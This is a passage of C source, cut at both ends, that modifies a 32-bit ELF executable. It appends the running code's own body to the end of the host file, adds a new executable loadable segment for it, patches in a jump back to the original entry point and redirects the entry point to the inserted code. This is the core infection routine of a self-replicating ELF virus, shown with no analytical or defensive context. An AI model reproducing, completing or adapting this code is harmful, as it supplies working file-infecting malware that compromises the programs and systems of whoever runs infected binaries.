	uint32_t base, vi;
	phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);	
        for (i = 0; i < ehdr->e_phnum; i++)
                if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0 &&
		   (i + 1) < ehdr->e_phnum && phdr[i + 1].p_type == PT_LOAD) {
		   	base = phdr[i].p_vaddr;
                        if (phdr[i].p_filesz != phdr[i].p_memsz)
                                break;
                        vi = i;
			goto ok;
                }
	goto _unmap;
ok:  	if ((phdr[vi + 1].p_offset & 0xfff) != 0) {
		uint32_t po = phdr[vi].p_filesz & 0xfffff000;
		MAKE_HOLE(phdr[vi].p_filesz, 0x1000);
		memmove(m + phdr[i].p_filesz, m + po, 0x1000);
		for (i = 0; i < ehdr->e_phnum; i++)
			if (phdr[i].p_vaddr >= phdr[vi + 1].p_vaddr)
				phdr[i].p_offset += 0x1000;
		if (ehdr->e_shoff >= po)
			ehdr->e_shoff += 0x1000;
		shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);
		for (i = 0; i < ehdr->e_shnum; i++)
			if (shdr[i].sh_offset >= phdr[vi].p_filesz)
				shdr[i].sh_offset += 0x1000;
	}
	phdr[vi].p_filesz = phdr[vi + 1].p_offset + phdr[vi + 1].p_filesz;
	phdr[vi].p_memsz = phdr[vi + 1].p_offset + phdr[vi + 1].p_memsz;
	phdr[vi].p_flags = PF_W | PF_R /* | PF_X */;
	vi++;
	bzero(&phdr[vi], sizeof(Elf32_Phdr));
	if (lseek(h, 0, 2) == l && write(h, g->self, g->size) == g->size) {
		uint32_t ve = base - (2*PAGE_SIZE) + (l & 0xfff);
		uint32_t vj = ehdr->e_entry - ve - 12;
		if (pwrite(h, &vj, 4, l + 8, 0) == 4) {
			phdr[vi].p_type = PT_LOAD;
			phdr[vi].p_offset = l;
			phdr[vi].p_vaddr = phdr[vi].p_paddr = ve;
			phdr[vi].p_filesz = g->size;
			phdr[vi].p_memsz = g->size;
			phdr[vi].p_flags = PF_R | PF_X;
			phdr[vi].p_align = 0x1000;
			ehdr->e_entry = ve;
		} 
	}
